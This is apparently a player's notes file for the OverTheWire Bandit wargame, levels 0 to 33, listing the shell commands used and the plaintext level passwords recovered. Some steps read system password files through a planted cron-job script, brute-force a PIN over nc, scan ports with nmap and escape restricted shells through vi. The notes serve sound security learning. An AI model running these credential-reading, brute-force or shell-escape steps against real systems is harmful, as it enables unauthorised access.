# overview
This repo is a snapshot save to the games played on overthewire.org

# bandit0
password exists in readme file

# bandit1
password exists in - file
need to read more about how bash handles special characters
we need to escape the character or indicate to the bash shell that the character needs to be processed as literal character. ' '

finished all the way until bandit14. stuck with submitting the password under /etc/bandit_password/bandit14 to localhost on port 30000

#bandit0
password in readme
bandit0:bandit0

#bandit1
password in readme
bandit1:NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjLi

#bandit2
password in special named file -
bandit2:rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi

#bandit3
password in special named file 'spaces in this filename'
bandit3:aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG

#bandit4
password in inhere/.hidden
bandit4:2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe

#bandit5
password in inhere file ASCII. file to get the file that's ascii and then cat
file names contain special chars
bandit5:lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR

#bandit6
file is not executable and is 1033 bytes in size
find . -size 1033c \! -executable
cat ./inhere/maybehere07/.file2
bandit6:P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU

#bandit7
find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
bandit7:./var/lib/dpkg/info/bandit7.password
cat ./var/lib/dpkg/info/bandit7.password
bandit7:z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S

#bandit8
grep millionth data.txt
millionth	TESKZC0XvTetK0S9xNwm25STk5iWrBvP
bandit8:TESKZC0XvTetK0S9xNwm25STk5iWrBvP

#bandit9
cat data.txt | sort | uniq -u
bandit9:EN632PlfYiZbn3PhVK3XOGSlNInNE00t

#bandit10
strings data.txt | grep -E '={2,}'
G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
bandit10:G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s

#bandit11
base64 -d data.txt
bandit11:6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM

#bandit12
bandit11@bandit:~$ cat data.txt | tr '[a-zA-Z]' '[nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM]'

bandit12:JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv

#bandit13
file is compressed multiple times
mkdir /tmp/hkr
cd /tmp/hkr
cp ~/data.txt data
xxd -r data > data.gz
gzip -d data.gz
bzip2 -d data
mv data.out data.gz
gzip -d data.gz
tar xvf data
tar xvf data5.bin
bzip2 -d data6.bin
tar xvf data6.bin.out
mv data8.bin data.gz
gzip -d data.gz
cat data

bandit13:wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw

#bandit14
no password only ssh private key
use the key to log on to bandit 14
ssh key stored in repo
don't forget to set the permissions to rw for user only

bandit14:fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq

#bandit15
the password for bandit 14 is stored in /etc/bandit_pass/bandit14
use this password with nc localhost 300000

bandit15:jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt

#bandit16
the password for bandit15 is in /etc/bandit_pass/bandit15
requirement is to connect to port 30001 with with a TLS encrypted connection.

openssl s_client localhost:30001

bandit16:JQttfApK4SeyHwDlI9SXGR50qclOAil1

#bandit17
service on port between 31000 and 32000
nmap localhost -p 31000-32000

we need to scan for the services running
nmap localhost -p <port> -sV
this takes time so lets give it time 

31046, 31691 echo, no ssl
31518        echo, ssl

bingo! 31790 is a match
got another private key for bandit 17

password for bandit17 is in /etc/bandit_pass/bandit17
bandit17:VwOSWtCA7lRKkTfbr2IDh6awj9RNZM5e

#bandit18
bandit17@bandit:~$ diff passwords.old passwords.new
42c42
< p6ggwdNHncnmCNxuAt0KtKVq185ZU7AW
---
> hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg

bandit18:hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg

#bandit19
readme file contains what looks like a password. the user does not have a corresponding shell 
apparently
contents of this file is awhqfNnAbc1naukrpqDYcF95h7HoMTrC

bandit19:awhqfNnAbc1naukrpqDYcF95h7HoMTrC

#bandit20
need to execute ./bandit20-do to do commands as bandit 20
need to read /etc/bandit_pass/bandit20
./bandit20-do cat /etc/bandit_pass/bandit20
VxCazJaVykI6W36BkBU0mJTCM8rR95XT

#bandit21
need to set up a server that listens for any incoming connection. if a connection happens
it then sends the password of bandit21. connect with suconnect binary to the same port
then the next password will come.

nc -l localhost <any-port-not-open> # then paste password
./suconnect <same-port>

bandit21:NvEJF7oVjkddltPSrdKEFOllh9V1IBcq

#bandit22
there is a cron job that runs, that exports bandit22 password to a certain place.
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff

bandit22:WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff

#bandit23
there is again a cron job that generates a variable location to store the password of bandit23
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:~$ 
bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ ls -la /tmp/8ca319486bfbbc3663ea0fbe81326349
-rw-rw-r-- 1 bandit23 bandit23 33 Mar 23 21:51 /tmp/8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ ^Ctmp/8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

bandit23:QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

#bandit24
first we need to find password for bandit24
cat /etc/bandit_pass/bandit24
cat: /etc/bandit_pass/bandit24: Permission denied
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ ls -la /var/spool/bandit24/foo/
ls: cannot open directory '/var/spool/bandit24/foo/': Permission denied

bandit23@bandit:~$ ls -la /var/spool/bandit24
total 256
dr-xr-x---  3 bandit24 bandit23   4096 Oct  5 06:19 .
drwxr-xr-x  5 root     root       4096 Oct  5 06:19 ..
drwxrwx-wx 15 root     bandit24 249856 Mar 23 22:28 foo

directory is executable we can write a script that will be excuted by the cron job as bandit24
so we can access files owned by bandit24 like the /etc/bandit_pass/bandit24.
need to figure out where does the output of the file go.

note that the script will be executed then after 60 seconds a sigterm will be sent

bandit23@bandit:/tmp/hkr123$ echo "mkdir /tmp/hkr123; chmod 777 /tmp/hkr123; cat /etc/bandit_pass/bandit24 > /tmp/hkr123/pass; chmod 777 /tmp/hkr123/pass" > /var/spool/bandit24/foo/exec.sh && chmod 777 /var/spool/bandit24/foo/exec.sh

retrieves the password for bandit24

bandit24:VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

#bandit25
we then use this script to post the password for bandit24 and do a brute force attack for the 
pincode.
bandit23@bandit:~$ for i in $(seq 1 9999); do printf "<password for bandit24> %40d\n" $i; done | nc localhost 30002

gives us password for bandit25
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

bandit25:p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

#bandit26,27
bandit26 has ssh key in bandit25 directory. as usual, bandit26 ssh key in repo
bandit26 does not have a login shell set but rather a program that is called showtext

showtext is just a script that executes more on ~/text.txt and then exits.
the exit closes the connection.

more is a text previewer. it works by filtering through pages. the thing is, if your terminal
is big enough it will print everything then exist (hard pard to find, had to google). to avoid 
this, resize the window to be small.

from more pages you can exeucte commands or press v to open vi
in vi you can type :e <somefile> to edit the file

:e /etc/bandit_pass/bandit26 gives the password
bandit26:c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1

now in the same vi session
:set shell=/bin/bash
:shell
you drop into a shell that is in bandit26
bandit26 has a bandit27-do that does commands as bandit27

./bandit27-do cat /etc/bandit_pass/bandit27

bandit27:YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS

#bandit28
password is in git repo
andit27@bandit:~$ mkdir /tmp/hkr1234
bandit27@bandit:~$ cd /tmp/hkr1234
bandit27@bandit:/tmp/hkr1234$ GIT_SSH_COMMAND="ssh -p 2220" git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
Cloning into 'repo'...
The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit27/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

bandit27-git@localhost's password: 
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (3/3), done.
bandit27@bandit:/tmp/hkr1234$ ls
repo
bandit27@bandit:/tmp/hkr1234$ cd repos
-bash: cd: repos: No such file or directory
bandit27@bandit:/tmp/hkr1234$ ls
repo
bandit27@bandit:/tmp/hkr1234$ ls repo/
README
bandit27@bandit:/tmp/hkr1234$ cat repo/README 
The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR
bandit28:AVanL161y9rsbcJIsFHuw35rjaOM19nR

#bandit29
again the password is in git repository. this time it's in the logs
bandit28@bandit:/tmp/hkr12345$ GIT_SSH_COMMAND="ssh -p 2220" git clone ssh://bandit28-git@localhost/home/bandit28-git/repo repo2
Cloning into 'repo2'...
The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit28/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts).
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

bandit28-git@localhost's password: 
Permission denied, please try again.
bandit28-git@localhost's password: 
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (2/2), done.
bandit28@bandit:/tmp/hkr12345$ ls
repo2
bandit28@bandit:/tmp/hkr12345$ cd repo2/
bandit28@bandit:/tmp/hkr12345/repo2$ ls
README.md
bandit28@bandit:/tmp/hkr12345/repo2$ cat README.md 
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: xxxxxxxxxx

bandit28@bandit:/tmp/hkr12345/repo2$ ls -la
total 16
drwxrwxr-x 3 bandit28 bandit28 4096 Mar 24 01:18 .
drwxrwxr-x 3 bandit28 bandit28 4096 Mar 24 01:18 ..
drwxrwxr-x 8 bandit28 bandit28 4096 Mar 24 01:18 .git
-rw-rw-r-- 1 bandit28 bandit28  111 Mar 24 01:18 README.md
bandit28@bandit:/tmp/hkr12345/repo2$ ls -la ~
total 20
drwxr-xr-x  2 root root 4096 Oct  5 06:19 .
drwxr-xr-x 70 root root 4096 Oct  5 06:20 ..
-rw-r--r--  1 root root  220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root root 3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root root  807 Jan  6  2022 .profile
bandit28@bandit:/tmp/hkr12345/repo2$ ls
README.md
bandit28@bandit:/tmp/hkr12345/repo2$ ls -la
total 16
drwxrwxr-x 3 bandit28 bandit28 4096 Mar 24 01:18 .
drwxrwxr-x 3 bandit28 bandit28 4096 Mar 24 01:18 ..
drwxrwxr-x 8 bandit28 bandit28 4096 Mar 24 01:18 .git
-rw-rw-r-- 1 bandit28 bandit28  111 Mar 24 01:18 README.md
bandit28@bandit:/tmp/hkr12345/repo2$ ls .git
branches  config  description  HEAD  hooks  index  info  logs  objects  packed-refs  refs
bandit28@bandit:/tmp/hkr12345/repo2$ git log
commit 14f754b3ba6531a2b89df6ccae6446e8969a41f3 (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Thu Oct 5 06:19:41 2023 +0000

    fix info leak

commit f08b9cc63fa1a4602fb065257633c2dae6e5651b
Author: Morla Porla <morla@overthewire.org>
Date:   Thu Oct 5 06:19:41 2023 +0000

    add missing data

commit a645bcc508c63f081234911d2f631f87cf469258
Author: Ben Dover <noone@overthewire.org>
Date:   Thu Oct 5 06:19:41 2023 +0000

    initial commit of README.md
bandit28@bandit:/tmp/hkr12345/repo2$ git checkout a645bcc508c63f081234911d2f631f87cf469258
Note: switching to 'a645bcc508c63f081234911d2f631f87cf469258'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at a645bcc initial commit of README.md
bandit28@bandit:/tmp/hkr12345/repo2$ ls
README.md
bandit28@bandit:/tmp/hkr12345/repo2$ cat README.md 
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: <TBD>

bandit28@bandit:/tmp/hkr12345/repo2$ git checkout 14f754b3ba6531a2b89df6ccae6446e8969a41f3
Previous HEAD position was a645bcc initial commit of README.md
HEAD is now at 14f754b fix info leak
bandit28@bandit:/tmp/hkr12345/repo2$ ls
README.md
bandit28@bandit:/tmp/hkr12345/repo2$ cat README.md 
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: xxxxxxxxxx

bandit28@bandit:/tmp/hkr12345/repo2$ git show 14f754b3ba6531a2b89df6ccae6446e8969a41f3
commit 14f754b3ba6531a2b89df6ccae6446e8969a41f3 (HEAD, origin/master, origin/HEAD, master)
Author: Morla Porla <morla@overthewire.org>
Date:   Thu Oct 5 06:19:41 2023 +0000

    fix info leak

diff --git a/README.md b/README.md
index b302105..5c6457b 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials
 
 - username: bandit29
-- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
+- password: xxxxxxxxxx

bandit29:tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S

#bandit30

bandit29@bandit:/tmp/hkrhkr1$ cd repo
bandit29@bandit:/tmp/hkrhkr1/repo$ ls
README.md
bandit29@bandit:/tmp/hkrhkr1/repo$ cat README.md 
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: <no passwords in production!>

bandit29@bandit:/tmp/hkrhkr1/repo$ ls
README.md
bandit29@bandit:/tmp/hkrhkr1/repo$ git log
commit 4364630b3b27c92aff7b36de7bb6ed2d30b60f88 (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Thu Oct 5 06:19:43 2023 +0000

    fix username

commit fca34ddb7d1ff1f78df36538252aea650b0b040d
Author: Ben Dover <noone@overthewire.org>
Date:   Thu Oct 5 06:19:43 2023 +0000

    initial commit of README.md
bandit29@bandit:/tmp/hkrhkr1/repo$ git branch -a
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/dev
  remotes/origin/master
  remotes/origin/sploits-dev
bandit29@bandit:/tmp/hkrhkr1/repo$ git checkout dev
Branch 'dev' set up to track remote branch 'dev' from 'origin'.
Switched to a new branch 'dev'
bandit29@bandit:/tmp/hkrhkr1/repo$ ls
code  README.md
bandit29@bandit:/tmp/hkrhkr1/repo$ ls -la
total 20
drwxrwxr-x 4 bandit29 bandit29 4096 Mar 24 16:22 .
drwxrwxr-x 3 bandit29 bandit29 4096 Mar 24 01:23 ..
drwxrwxr-x 2 bandit29 bandit29 4096 Mar 24 16:22 code
drwxrwxr-x 8 bandit29 bandit29 4096 Mar 24 16:22 .git
-rw-rw-r-- 1 bandit29 bandit29  134 Mar 24 16:22 README.md
bandit29@bandit:/tmp/hkrhkr1/repo$ ls code
gif2ascii.py
bandit29@bandit:/tmp/hkrhkr1/repo$ cat code/gif2ascii.py 

bandit29@bandit:/tmp/hkrhkr1/repo$ cat README.md 
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS

bandit30:xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS

#bandit31
git repo again. clonse as usual. repo has one commit and on README.md file that is empty.
repo has tags

git tag
secret

git rev-parse secret
fetches the sha for the object this tag refers to (tags are references to git objects)

this object is not a tree however git show prints its contents. it looks like the contents are the
password to bandit 31.

bandit31:OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt

#bandit32
another git repository
doing a simple push solves the level
remove contents of .gitignore
add file key.txt with content May I come in?
git push with GIT_SSH_COMMAND modified then it should work

bandit32:rmCBvG56y58BXzv98yZGdO7ATVL5dW8y

#bandit33
once logged in into bandit32, we are inside an uppershell program. the uppershell program is just
a program that executes all given commands in an inferior shell, the culprit is that it transforms
all the ASCII letters into uppercase letters. this is true for all alpha letters.
hence, the idea is that we need to execute a shell command that does not rely on alpha letters.

from bash special characters $0 refers to the SHELL of the current executing script. 
this points to /bin/sh so just doing $0 we get inside a sh script then we can read password for 
bandit33 from /etc/bandit_pass/bandit33.

bandit33:odHo63fHiFqcWWJG9rLiLDtPm45KzUKy

#bandit34
bandit33@bandit:~$ cat README.txt 
Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!
bandit33@bandit:~$ 
logout
Connection to bandit.labs.overthewire.org closed.




































